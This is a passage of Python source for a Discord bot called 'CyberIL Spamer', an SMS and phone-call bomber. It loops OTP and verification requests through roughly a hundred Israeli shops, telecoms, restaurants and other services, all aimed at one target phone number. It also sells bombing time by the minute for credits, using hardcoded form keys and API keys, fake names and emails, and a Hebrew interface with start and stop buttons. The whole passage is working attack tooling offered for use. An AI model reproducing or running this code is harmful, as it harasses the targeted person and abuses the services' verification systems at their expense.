             "sec-fetch-dest": "empty", "sec-fetch-mode": "cors"}
        if extra:
            h.update(extra)
        return h

    connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
    async with aiohttp.ClientSession(connector=connector) as s:
        atmos_stores = [
            "1","2","3","4","5","7","8","13","15","18","21","23","24","27",
            "28","29","33","35","48","51","56","57","59",
            "2008","2011","2012","2014","2041","2052","2053","2056","2059",
            "2063","2070","2073","2076","2078","2087","2088","2091",
        ]
        
        atmos_sms = await process_atmos_batch(s, raw, atmos_stores, is_call=False)
        atmos_call = await process_atmos_batch(s, raw, atmos_stores, is_call=True)
        
        atmos_club = [
            atmos_request(s, "23", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
            atmos_request(s, "59", raw, origin="https://club-register.atmos.co.il", referer="https://club-register.atmos.co.il/", is_call=False),
        ]

        geteat_fd = aiohttp.FormData()
        geteat_fd.add_field("restaurant_id", "9")
        geteat_fd.add_field("phone", raw)
        geteat_fd.add_field("testing", "false")
        
        tasks = [
            send_request(s, "https://netfree.link/api/user/verify-phone/get-call",
                json_data={"agreeTou": True, "phone": formatted},
                headers_extra=json_headers("https://netfree.link", "https://netfree.link/welcome/", {"sec-fetch-site": "same-origin"}),
                tag="netfree"),
            claude_request(s, raw),
            oshioshi_request(s, raw),
            freetv_request(s, raw),
            webcut_request(s, raw),
            freeivr_request(s, raw),
            mitmachim_request(s, raw),
            pelephone_request(s, raw),
            cellcom_request(s, raw),
            partner_request(s, raw),
            hot_request(s, raw),
            bezeq_request(s, raw),
            gett_request(s, formatted, random_email),
            shufersal_request(s, raw),
            ramilevy_request(s, raw),
            victory_request(s, raw),
            tenbis_request(s, raw),
            mcdonalds_request(s, raw),
            burgerking_request(s, raw),
            kfc_request(s, raw),
            pizzahut_request(s, raw),
            dominos_request(s, raw),
            burgeranch_request(s, raw),
            pango_request(s, raw),
            hopon_request(s, raw),
            yad2_request(s, raw),
            paybox_request(s, raw),
            superpharm_request(s, raw),
            zap_request(s, raw),
            wolt_request(s, raw),
            send_request(s, "https://www.negev-group.co.il/customer/ajax/post/",
                form=f"form_key=a93dnWr8cjYH8wZ2&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.negev-group.co.il", "https://www.negev-group.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="negev-group"),
            send_request(s, "https://www.gali.co.il/customer/ajax/post/",
                form=f"form_key=xT4xBP6oaqFhxMVR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.gali.co.il", "https://www.gali.co.il/"),
                tag="gali"),
            send_request(s, "https://www.aldoshoes.co.il/customer/ajax/post/",
                form=f"form_key=FD1Zm1GUMQXUivz6&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.aldoshoes.co.il", "https://www.aldoshoes.co.il/"),
                tag="aldoshoes"),
            send_request(s, "https://www.hoodies.co.il/customer/ajax/post/",
                form=f"form_key=OCYFcuUfiQLCbya5&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.hoodies.co.il", "https://www.hoodies.co.il/"),
                tag="hoodies"),
            send_request(s, "https://api.gomobile.co.il/api/login",
                json_data={"phone": raw},
                headers_extra=json_headers("https://www.gomobile.co.il", "https://www.gomobile.co.il/"),
                tag="gomobile"),
            send_request(s, "https://bonitademas.co.il/apps/imapi-customer",
                json_data={"action":"login","otpBy":"sms","otpValue":raw},
                headers_extra=json_headers("https://bonitademas.co.il", "https://bonitademas.co.il/"),
                tag="bonitademas"),
            send_request(s, "https://story.magicetl.com/public/shopify/apps/otp-login/step-one",
                json_data={"phone":raw},
                headers_extra=json_headers("https://storyonline.co.il", "https://storyonline.co.il/"),
                tag="storyonline"),
            send_request(s, "https://www.crazyline.com/customer/ajax/post/",
                form=f"form_key=qjDmQDc2pwYJIEin&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.crazyline.com", "https://www.crazyline.com/"),
                tag="crazyline"),
            send_request(s, "https://authentication.wolt.com/v1/captcha/site_key_authenticated",
                json_data={"phone_number": raw, "operation": "request_number_verification"},
                headers_extra=json_headers("https://wolt.com", "https://wolt.com/"),
                tag="wolt-captcha"),
            send_request(s, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber?uuid=4c48ed0d-9622-4a1e-ac70-2821631b680b&apiKey=BA6A19D2-F5BD-4B75-A080-6BD1E2FBEF54&sessionID=24014c96-61ca-4cd6-87a9-9324aa2f3150&culture=he_IL&apiVersion=2",
                json_data={"phoneNumber": raw, "isCalling": True},
                headers_extra=json_headers("https://www.mishloha.co.il", "https://www.mishloha.co.il/"),
                tag="mishloha"),
            send_request(s, "https://www.golfkids.co.il/customer/ajax/post/",
                form=f"form_key=XB0c9tAkTouRgHrI&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.golfkids.co.il", "https://www.golfkids.co.il/"),
                tag="golfkids"),
            send_request(s, "https://www.onot.co.il/customer/ajax/post/",
                form=f"form_key=xmemtkBNMoUSLrMN&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.onot.co.il", "https://www.onot.co.il/"),
                tag="onot"),
            send_request(s, "https://fox.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"498d9bb2-0fa8-4d9c-9e71-f44fcbcd2195"},
                headers_extra=json_headers("https://fox.co.il", "https://fox.co.il/"),
                tag="fox"),
            send_request(s, "https://www.foxhome.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"6db5a63b-6882-414f-a090-de263dd917d7"},
                headers_extra=json_headers("https://www.foxhome.co.il", "https://www.foxhome.co.il/"),
                tag="foxhome"),
            send_request(s, "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"ab29f239-0637-4c8e-8af5-fdfbaeb4b493"},
                headers_extra=json_headers("https://www.laline.co.il", "https://www.laline.co.il/"),
                tag="laline"),
            send_request(s, "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber":raw,"uuid":"9961459f-9f83-4aab-9cee-58b1f6793547"},
                headers_extra=json_headers("https://footlocker.co.il", "https://footlocker.co.il/"),
                tag="footlocker"),
            send_request(s, "https://www.golfco.co.il/customer/ajax/post/",
                form=f"form_key=SIiL0WFN6AtJF6lb&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.golfco.co.il", "https://www.golfco.co.il/"),
                tag="golfco"),
            send_request(s, "https://www.timberland.co.il/customer/ajax/post/",
                form=f"form_key=gU7iqYv5eiwuKVef&bot_validation=1&type=login&phone={raw}",
                headers_extra=form_headers("https://www.timberland.co.il", "https://www.timberland.co.il/"),
                tag="timberland"),
            send_request(s, "https://www.solopizza.org.il/_a/aff_otp_auth",
                form=f"value={raw}&type=phone&projectId=1",
                headers_extra=form_headers("https://www.solopizza.org.il", "https://www.solopizza.org.il/"),
                tag="solopizza"),
            send_request(s, "https://users-auth.hamal.co.il/auth/send-auth-code",
                json_data={"value":raw,"type":"phone","projectId":"1"},
                headers_extra=json_headers("https://hamal.co.il", "https://hamal.co.il/"),
                tag="hamal"),
            send_request(s, "https://www.urbanica-wh.com/customer/ajax/post/",
                form=f"form_key=sucdtpszDEqdOgkv&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.urbanica-wh.com", "https://www.urbanica-wh.com/"),
                tag="urbanica"),
            send_request(s, "https://www.intima-il.co.il/customer/ajax/post/",
                form=f"form_key=ppjX1yBLuS9rB7zZ&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.intima-il.co.il", "https://www.intima-il.co.il/"),
                tag="intima"),
            send_request(s, "https://www.steimatzky.co.il/customer/ajax/post/",
                form=f"form_key=4RmX16417urLzC5J&bot_validation=1&type=login&country_code=972&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.steimatzky.co.il", "https://www.steimatzky.co.il/"),
                tag="steimatzky"),
            send_request(s, "https://www.globes.co.il/news/login-2022/ajax_handler.ashx?get-value-type",
                form=f"value={raw}&value_type=",
                headers_extra=form_headers("https://www.globes.co.il", "https://www.globes.co.il/"),
                tag="globes"),
            send_request(s, "https://www.moraz.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}&email=&from_reg=false",
                headers_extra=form_headers("https://www.moraz.co.il", "https://www.moraz.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="moraz"),
            send_request(s, "https://itaybrands.co.il/apps/dream-card/api/proxy/otp/send",
                json_data={"phoneNumber": raw, "uuid": sid},
                headers_extra=json_headers("https://itaybrands.co.il", "https://itaybrands.co.il/", {"sec-fetch-site": "same-origin", "x-requested-with": "XMLHttpRequest"}),
                tag="itaybrands"),
            send_request(s, "https://www.spicesonline.co.il/wp-admin/admin-ajax.php",
                form=f"action=validate_user_by_sms&phone={raw}",
                headers_extra=form_headers("https://www.spicesonline.co.il", "https://www.spicesonline.co.il/"),
                tag="spicesonline"),
            send_request(s, "https://www.stepin.co.il/customer/ajax/post/",
                form=f"form_key=BxItwcIQhlhsnaoi&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.stepin.co.il", "https://www.stepin.co.il/"),
                tag="stepin"),
            send_request(s, "https://mobile.rami-levy.co.il/api/Helpers/OTP",
                form=f"phone={raw}&template=OTP&type=1",
                headers_extra={"Content-Type": "application/x-www-form-urlencoded", "accept-encoding": "gzip, deflate", "origin": "https://mobile.rami-levy.co.il", "referer": "https://mobile.rami-levy.co.il/", "x-requested-with": "XMLHttpRequest", "User-Agent": random_agent()},
                tag="ramilevy-mobile"),
            send_request(s, "https://api.zygo.co.il/v2/auth/create-verify-token",
                json_data={"phone": raw},
                headers_extra={"Content-Type": "application/json", "origin": "https://zygo.co.il", "referer": "https://zygo.co.il/", "accept-encoding": "gzip, deflate", "sec-fetch-site": "same-site"},
                tag="zygo"),
            send_request(s, "https://ros-rp.tabit.cloud/services/loyalty/customerProfile/auth/mobile",
                json_data={"mobile": raw},
                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "accountguid": "0787F516-E97E-408A-A1CF-53D0C4D57C7C", "cpversion": "3.3.0", "env": "il", "joinchannelguid": "74FE1A48-0FA0-4C8F-B962-6AE88A242023", "siteid": "6203e7787694b434c7a7eb0a", "origin": "https://customer-profile.tabit.cloud", "referer": "https://customer-profile.tabit.cloud/", "sec-fetch-site": "same-site"},
                tag="tabit"),
            send_request(s, "GET", f"https://ivr.business/api/Customer/getTempCodeToPhoneVarification/{raw}",
                headers_extra={"origin": "https://ivr.business", "referer": "https://ivr.business/", "accept-encoding": "gzip, deflate"},
                tag="ivr"),
            send_request(s, "POST", "https://www.call2all.co.il/ym/api/SelfCreateNewCustomer",
                data={"configCode": "ivr2_10_23", "phone": raw, "sendCodeBy": "CALL", "step": "SendValidPhone"},
                headers_extra={"origin": "https://www.call2all.co.il", "referer": "https://www.call2all.co.il/", "accept-encoding": "gzip, deflate"},
                tag="call2all"),
            send_request(s, "POST", "https://rest-api.dibs-app.com/otps",
                json_data={"phoneNumber": formatted},
                headers_extra=json_headers("https://dibs-app.com", "https://dibs-app.com/", {"sec-fetch-site": "same-site"}),
                tag="dibs"),
            send_request(s, "POST", "https://www.nine-west.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.nine-west.co.il", "https://www.nine-west.co.il/"),
                tag="ninewest"),
            send_request(s, "POST", "https://www.leecooper.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.leecooper.co.il", "https://www.leecooper.co.il/"),
                tag="leecooper"),
            send_request(s, "POST", "https://www.kikocosmetics.co.il/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.kikocosmetics.co.il", "https://www.kikocosmetics.co.il/"),
                tag="kiko"),
            send_request(s, "POST", "https://www.topten-fashion.com/customer/ajax/post/",
                form=f"form_key=soiphrLs3vM2A1Ta&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.topten-fashion.com", "https://www.topten-fashion.com/"),
                tag="topten"),
            send_request(s, "POST", "https://www.lehamim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                headers_extra={**form_headers("https://www.lehamim.co.il", "https://www.lehamim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="lehamim"),
            send_request(s, "POST", "https://www.555.co.il/ms/rest/otpservice/client/send/phone?contentContext=3&returnTo=/pearl/apps/vehicle-policy?insuranceTypeId=1",
                json_data={"password": None, "phoneNr": raw, "sendType": 1, "systemType": None},
                headers_extra=json_headers("https://www.555.co.il", "https://www.555.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="555"),
            send_request(s, "POST", "https://www.jungle-club.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}",
                headers_extra=form_headers("https://www.jungle-club.co.il", "https://www.jungle-club.co.il/"),
                tag="jungleclub"),
            send_request(s, "POST", "https://blendo.co.il/wp-admin/admin-ajax.php",
                form=f"action=simply-check-member-cellphone&cellphone={raw}",
                headers_extra=form_headers("https://blendo.co.il", "https://blendo.co.il/"),
                tag="blendo"),
            send_request(s, "POST", "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
                json_data={"phoneNumber": raw, "sourceFrom": "AuthJS", "isCalling": True},
                headers_extra=json_headers("https://mishloha.co.il", "https://mishloha.co.il/", {"sec-fetch-site": "same-site"}),
                tag="mishloha2"),
            send_request(s, "POST", "https://we.care.co.il/wp-admin/admin-ajax.php",
                data=f"post_id=351178&form_id=7079d8dd&referer_title=Care&queried_id=351178&form_fields[name]=CyberIL&form_fields[phone]={raw}&form_fields[email]={random_email}&form_fields[accept]=on&action=elementor_pro_forms_send_form&referrer=https://we.care.co.il/",
                headers_extra=form_headers("https://we.care.co.il", "https://we.care.co.il/glasses-tor/"),
                tag="wecare"),
            send_request(s, "POST", "https://www.matara.pro/nedarimplus/V6/Files/WebServices/DebitBit.aspx?Action=CreateTransaction",
                form=f"MosadId=7000297&ClientName=CyberIL&Phone={raw}&Amount=100&Tashlumim=1",
                headers_extra={"Content-Type": FORM_TYPE, "accept-encoding": "gzip, deflate", "referer": "https://www.matara.pro/", "origin": "https://www.matara.pro"},
                tag="matara"),
            send_request(s, "POST", "https://wissotzky-tlab.co.il/wp/wp-admin/admin-ajax.php",
                form=f"action=otp_register&otp_phone={raw}&first_name=Cyber&last_name=IL&email={random_email}&date_birth=2000-11-11&approve_terms=true&approve_marketing=true",
                headers_extra=form_headers("https://wissotzky-tlab.co.il", "https://wissotzky-tlab.co.il/"),
                tag="wissotzky"),
            send_request(s, "POST", "https://clocklb.ok2go.co.il/api/v2/users/login",
                json_data={"phone": raw},
                headers_extra=json_headers("https://clocklb.ok2go.co.il", "https://clocklb.ok2go.co.il/", {"sec-fetch-site": "same-origin"}),
                tag="ok2go"),
            send_request(s, "POST", "https://api-endpoints.histadrut.org.il/signup/send_code",
                json_data={"phone": raw},
                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://signup.histadrut.org.il", "referer": "https://signup.histadrut.org.il/", "x-api-key": "480317067f32f2fd3de682472403468da507b8d023a531602274d17d727a9189", "sec-fetch-site": "same-site"},
                tag="histadrut"),
            send_request(s, "POST", "https://www.papajohns.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                headers_extra={**form_headers("https://www.papajohns.co.il", "https://www.papajohns.co.il/"), "sec-fetch-site": "same-origin"},
                tag="papajohns"),
            send_request(s, "POST", "https://www.iburgerim.co.il/_a/aff_otp_auth",
                form=f"phone={raw}",
                headers_extra={**form_headers("https://www.iburgerim.co.il", "https://www.iburgerim.co.il/"), "sec-fetch-site": "same-origin"},
                tag="iburgerim"),
            send_request(s, "GET", f"https://www.americanlaser.co.il/wp-json/calc/v1/send-sms?phone={raw}",
                headers_extra={"referer": "https://www.americanlaser.co.il/calc/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "accept-encoding": "gzip, deflate"},
                tag="americanlaser"),
            send_request(s, "POST", f"https://wb0lovv2z8.execute-api.eu-west-1.amazonaws.com/prod/api/v1/getOrdersSiteData?otpPhone={raw}",
                json_data={"id": sid, "domain": "5fc39fabffae5ac5a229cebb", "action": "generateOneTimer", "phoneNumber": raw},
                headers_extra=json_headers("https://orders.beecommcloud.com", "https://orders.beecommcloud.com/", {"sec-fetch-site": "cross-site"}),
                tag="beecomm"),
            send_request(s, "POST", "https://xtra.co.il/apps/api/inforu/sms",
                json_data={"phoneNumber": raw},
                headers_extra={"Content-Type": "application/json", "accept-encoding": "gzip, deflate", "origin": "https://xtra.co.il", "referer": "https://xtra.co.il/pages/brand/cafe-cafe", "sec-fetch-site": "same-origin"},
                tag="xtra"),
            send_request(s, "POST", "https://www.lighting.co.il/customer/ajax/post/",
                form=f"form_key=OoHXm6oGzca2WeJR&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.lighting.co.il", "https://www.lighting.co.il/"),
                tag="lighting"),
            send_request(s, "POST", "https://proxy1.citycar.co.il/api/verify/login",
                json_data={"phoneNumber": formatted, "verifyChannel": 2, "loginOrRegister": 1},
                headers_extra=json_headers("https://citycar.co.il", "https://citycar.co.il/", {"sec-fetch-site": "same-site"}),
                tag="citycar"),
            send_request(s, "POST", "https://www.lilit.co.il/customer/ajax/post/",
                form=f"form_key=sXWXnRwFsKy5YX9E&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.lilit.co.il", "https://www.lilit.co.il/"),
                tag="lilit"),
            send_request(s, "POST", "https://www.castro.com/customer/ajax/post/",
                form=f"bot_validation=1&type=login&telephone={raw}",
                headers_extra=form_headers("https://www.castro.com", "https://www.castro.com/"),
                tag="castro"),
            send_request(s, "POST", "https://www.bathandbodyworks.co.il/customer/ajax/post/",
                form=f"form_key=ckGbaafzIC4Yi2l8&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.bathandbodyworks.co.il", "https://www.bathandbodyworks.co.il/home"),
                tag="bathandbody"),
            send_request(s, "POST", "https://www.golbary.co.il/customer/ajax/post/",
                form=f"form_key=w1deINjU3Ffpj8ct&bot_validation=1&type=login&telephone={raw}&code=&compare_email=&compare_identity=",
                headers_extra=form_headers("https://www.golbary.co.il", "https://www.golbary.co.il/"),
                tag="golbary"),
            send_request(s, "POST", "https://api.getpackage.com/v1/graphql/",
                json_data={"operationName": "sendCheckoutRegistrationCode", "variables": {"userName": raw}, "query": "mutation sendCheckoutRegistrationCode($userName: String!) { sendCheckoutRegistrationCode(userName: $userName) { status __typename } }"},
                headers_extra=json_headers("https://www.getpackage.com", "https://www.getpackage.com/", {"sec-fetch-site": "same-site"}),
                tag="getpackage"),
            send_request(s, "POST", "https://ohmama.co.il/?wc-ajax=validate_user_by_sms",
                form=f"otp_login_nonce=de90e8f67b&phone={raw}&security=de90e8f67b",
                headers_extra={**form_headers("https://ohmama.co.il", "https://ohmama.co.il/"), "sec-fetch-site": "same-origin"},
                tag="ohmama"),
            send_request(s, "POST", "https://server.myofer.co.il/api/sendAuthSms",
                json_data={"phoneNumber": raw},
                headers_extra=json_headers("https://www.myofer.co.il", "https://www.myofer.co.il/", {"sec-fetch-site": "same-site", "x-app-version": "3.0.0"}),
                tag="myofer"),
            send_request(s, "POST", "https://arcaffe.co.il/wp-admin/admin-ajax.php",
                form=f"action=user_login_step_1&phone_number={raw}&step[]=1",
                headers_extra=form_headers("https://arcaffe.co.il", "https://arcaffe.co.il/"),
                tag="arcaffe"),
            send_request(s, "POST", "https://api.noyhasade.co.il/api/login?origin=web",
                json_data={"phone": raw, "email": False, "ip": "1.1.1.1"},
                headers_extra=json_headers("https://www.noyhasade.co.il", "https://www.noyhasade.co.il/", {"sec-fetch-site": "same-site"}),
                tag="noyhasade"),
            send_request(s, "POST", "https://api.geteat.co.il/auth/sendValidationCode",
                data=geteat_fd,
                headers_extra={"User-Agent": random_agent(), "accept-encoding": "gzip, deflate", "origin": "https://order.geteat.co.il", "referer": "https://order.geteat.co.il/", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site"},
                tag="geteat"),
        ] + atmos_club

        all_res = await asyncio.gather(*tasks, return_exceptions=True)
        success = 0
        failed = []
        
        for r in all_res:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                if len(r) == 3:
                    ok, name, reason = r
                    if ok:
                        success += 1
                    else:
                        failed.append(f"{name} ({reason})")
                else:
                    ok, name = r
                    if ok:
                        success += 1
                    else:
                        failed.append(name)

        for r in atmos_sms:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                if len(r) == 3:
                    ok, name, reason = r
                    if ok:
                        success += 1
                    else:
                        failed.append(f"{name} ({reason})")
                else:
                    ok, name = r
                    if ok:
                        success += 1
                    else:
                        failed.append(name)
                        
        for r in atmos_call:
            if isinstance(r, Exception):
                continue
            elif isinstance(r, tuple):
                if len(r) == 3:
                    ok, name, reason = r
                    if ok:
                        success += 1
                    else:
                        failed.append(f"{name} ({reason})")
                else:
                    ok, name = r
                    if ok:
                        success += 1
                    else:
                        failed.append(name)

        return success, failed

def create_panel():
    embed = discord.Embed(
        title="**CYBERIL SPAMER**",
        description="```המערכת המובילה בישראל```",
        color=COLOR_MAIN
    )
    embed.add_field(
        name="**איך מתחילים?**",
        value="```1. לחץ על התחל ספאם\n2. הזן מספר טלפון\n3. בחר כמות קרדיטים\n4. אשר והמתן```",
        inline=False
    )
    embed.add_field(
        name="**עלות**",
        value=f"```כל קרדיט = דקה אחת של ספאם```",
        inline=False
    )
    embed.add_field(
        name="**הערות**",
        value=f"```דיליי של {COOLDOWN_TIME} שניות בין ספאם לאותו מספר```",
        inline=False
    )
    embed.set_footer(text=f"CyberIL Spamer © 2026")
    return embed

def create_gift_panel():
    embed = discord.Embed(
        title="**קרדיטים חינם**",
        description="```קבל קרדיט אחד כל 24 שעות```",
        color=0xFFD700
    )
    embed.add_field(
        name="**איך מקבלים?**",
        value="```לחץ על הכפתור למטה```",
        inline=False
    )
    embed.set_footer(text="CyberIL Spamer © 2026")
    return embed

class StopAttack(discord.ui.View):
    def __init__(self, user_id: int):
        super().__init__(timeout=None)
        self.user_id = user_id

    @discord.ui.button(label="עצור ספאם", style=discord.ButtonStyle.danger, emoji="🛑", custom_id="stop_attack")
    async def stop_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id and not is_admin(interaction):
            await interaction.response.send_message("❌ לא הספאם שלך", ephemeral=True)
            return
        ev = active_missions.get(self.user_id)
        if ev:
            ev.set()
        button.disabled = True
        await interaction.response.edit_message(view=self)

class ConfirmAttack(discord.ui.View):
    def __init__(self, phone: str, cost: int, user_id: int):
        super().__init__(timeout=30)
        self.phone = phone
        self.cost = cost
        self.user_id = user_id
        self.is_running = False

    @discord.ui.button(label="✅ כן, התחל ספאם", style=discord.ButtonStyle.danger, emoji="✅", custom_id="confirm_attack")
    async def confirm_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא האישור שלך", ephemeral=True)
            return
        
        if self.is_running:
            await interaction.response.send_message("⚠️ הספאם כבר בתהליך", ephemeral=True)
            return
        
        self.is_running = True
        self.stop()
        
        await interaction.response.defer(ephemeral=True)
        
        for _ in range(self.cost):
            if not await use_credit(self.user_id):
                embed = discord.Embed(title="❌ אין מספיק קרדיטים", color=COLOR_DANGER)
                await interaction.edit_original_response(embed=embed, view=None)
                return

        event = asyncio.Event()
        active_missions[self.user_id] = event

        embed = discord.Embed(title="🔄 ספאם בתהליך", description=f"מספמם את **{self.phone}**\nזמן: ~{self.cost} דקות", color=COLOR_WARNING)
        await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))

        total_success = 0
        total_failed = 0
        start_time = time.time()
        end_time = start_time + (self.cost * 60)
        last_update = time.time()

        try:
            while time.time() < end_time:
                if event.is_set():
                    break
                
                s, f = await run_all(self.phone)
                total_success += s
                total_failed += f
                
                if time.time() - last_update >= 3:
                    remaining = int((end_time - time.time()) / 60)
                    embed = discord.Embed(
                        title="🔄 ספאם בתהליך",
                        description=f"מספמם את **{self.phone}**\nנותר: ~{remaining} דקות\n\n✅ הצלחות: {total_success}\n❌ כשלונות: {total_failed}",
                        color=COLOR_WARNING
                    )
                    await interaction.edit_original_response(embed=embed, view=StopAttack(self.user_id))
                    last_update = time.time()

            await apply_cooldown(self.phone)
            active_missions.pop(self.user_id, None)
            stopped = event.is_set()

            await save_log(
                user_id=self.user_id,
                username=str(interaction.user),
                phone=self.phone,
                cost=self.cost,
                success=total_success,
                failed=total_failed,
                duration=self.cost * 60
            )

            bal = await format_balance(self.user_id)
            
            if stopped:
                final = discord.Embed(title="⏹️ ספאם הופסק", color=COLOR_WARNING)
            else:
                final = discord.Embed(title="✅ ספאם הושלם", color=COLOR_SUCCESS)
            
            final.add_field(name="📱 יעד", value=self.phone, inline=True)
            final.add_field(name="⏱️ משך", value=f"~{self.cost} דקות", inline=True)
            final.add_field(name="✅ הצלחות", value=str(total_success), inline=True)
            final.add_field(name="❌ כשלונות", value=str(total_failed), inline=True)
            final.add_field(name="💎 קרדיטים נותרים", value=bal, inline=True)
            
            await interaction.edit_original_response(embed=final, view=None)

        except Exception as e:
            active_missions.pop(self.user_id, None)
            error_embed = discord.Embed(title="❌ שגיאה", description=str(e)[:180], color=COLOR_DANGER)
            await interaction.edit_original_response(embed=error_embed, view=None)

    @discord.ui.button(label="❌ בטל", style=discord.ButtonStyle.secondary, emoji="❌", custom_id="cancel_attack")
    async def cancel_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id != self.user_id:
            await interaction.response.send_message("❌ לא שלך", ephemeral=True)
            return
        self.stop()
        embed = discord.Embed(title="❌ בוטל", description="לא נוכו קרדיטים", color=COLOR_INFO)
        await interaction.response.edit_message(embed=embed, view=None)

class LaunchModal(discord.ui.Modal, title="התחל ספאם"):
    phone = discord.ui.TextInput(label="מספר טלפון", placeholder="0501234567", min_length=10, max_length=10, style=discord.TextStyle.short)
    credits = discord.ui.TextInput(label="כמות קרדיטים", placeholder="1-100", min_length=1, max_length=3, style=discord.TextStyle.short)

    async def on_submit(self, interaction: discord.Interaction):
        phone_num = self.phone.value.strip()
        if not re.match(r"^05[0-9]{8}$", phone_num):
            embed = discord.Embed(title="❌ שגיאה", description="מספר לא תקין", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        try:
            credits_num = int(self.credits.value.strip())
            if credits_num < 1 or credits_num > MAX_CREDIT_SPEND:
                raise ValueError
        except ValueError:
            embed = discord.Embed(title="❌ שגיאה", description="כמות לא תקינה", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        uid = interaction.user.id

        bal = await fetch_balance(uid)
        unlimited = await has_unlimited(uid)

        if bal < credits_num and not unlimited:
            embed = discord.Embed(title="❌ שגיאה", description="חסרים קרדיטים", color=COLOR_DANGER)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        on_cd, remain = await check_cooldown(phone_num)
        if on_cd:
            embed = discord.Embed(title="⏱️ דיליי", description=f"המתן {remain} שניות", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return

        bal_str = await format_balance(uid)
        
        confirm = discord.Embed(
            title="⚠️ אישור ספאם",
            description=f"```\nיעד: {phone_num}\nמשך: {credits_num} דקות\nעלות: {credits_num} קרדיטים\nיתרה: {bal_str}\n```",
            color=COLOR_WARNING
        )
        
        try:
            await interaction.response.send_message(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)
        except discord.errors.NotFound:
            await interaction.followup.send(embed=confirm, view=ConfirmAttack(phone=phone_num, cost=credits_num, user_id=uid), ephemeral=True)

class MainPanel(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל ספאם", style=discord.ButtonStyle.danger, emoji="🚀", custom_id="start_spam")
    async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        now = time.time()
        last = cooldown_tracker.get(interaction.user.id, 0)
        if now - last < LAUNCH_DELAY:
            rem = int(LAUNCH_DELAY - (now - last))
            embed = discord.Embed(title="⏱️ דיליי", description=f"המתן {rem} שניות", color=COLOR_WARNING)
            await interaction.response.send_message(embed=embed, ephemeral=True)
            return
        cooldown_tracker[interaction.user.id] = now
        await interaction.response.send_modal(LaunchModal())

    @discord.ui.button(label="💎 הקרדיטים שלי", style=discord.ButtonStyle.primary, emoji="💎", custom_id="check_balance")
    async def balance_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        bal_str = await format_balance(uid)
        stats = await get_user_stats(uid)

        embed = discord.Embed(title="💎 הקרדיטים שלי", description=f"יתרה: **{bal_str}**", color=COLOR_INFO)
        
        if stats:
